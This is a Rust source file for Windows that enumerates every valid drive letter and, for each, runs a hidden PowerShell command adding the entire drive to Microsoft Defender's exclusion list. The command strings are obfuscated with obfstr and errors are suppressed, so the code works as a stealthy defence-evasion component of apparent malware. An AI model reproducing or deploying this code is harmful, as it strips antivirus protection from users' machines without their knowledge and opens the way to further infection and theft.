use std::ffi::OsStr;
use std::os::windows::ffi::OsStrExt;

use winapi::um::fileapi::GetDriveTypeW;
use winapi::um::winbase::{DRIVE_UNKNOWN, DRIVE_NO_ROOT_DIR};
use powershell_script::PsScriptBuilder;

pub async fn add_drives_to_exclusion() -> Vec<String> {
    let drives = get_available_drives();
    let mut added = Vec::new();

    for drive in drives {
        let path = format!("{}\\", drive);
        if add_exclusion_path(&path).await {
            added.push(drive);
        }
    }

    added
}

fn get_available_drives() -> Vec<String> {
    let mut drives = Vec::new();

    #[cfg(windows)]
    {
        for letter in b'A'..=b'Z' {
            let drive_letter = format!("{}:\\", letter as char);
            let drive_path: Vec<u16> = OsStr::new(&drive_letter)
                .encode_wide()
                .chain(std::iter::once(0))
                .collect();

            unsafe {
                let drive_type = GetDriveTypeW(drive_path.as_ptr());
                
                if drive_type != DRIVE_UNKNOWN && drive_type != DRIVE_NO_ROOT_DIR {
                    drives.push(format!("{}:", letter as char));
                }
            }
        }
    }

    drives
}

async fn add_exclusion_path(path: &str) -> bool {
    let cmd_prefix = obfstr::obfstr!("Add-MpPreference -ExclusionPath '").to_string();
    let cmd_suffix = obfstr::obfstr!("' -ErrorAction SilentlyContinue").to_string();
    let script = format!("{}{}{}", cmd_prefix, path, cmd_suffix);

    let result = tokio::task::spawn_blocking(move || {
        PsScriptBuilder::new()
            .no_profile(true)
            .non_interactive(true)
            .hidden(true)
            .print_commands(false)
            .build()
            .run(&script)
    }).await;

    match result {
        Ok(Ok(_)) => true,
        _ => false,
    }
}
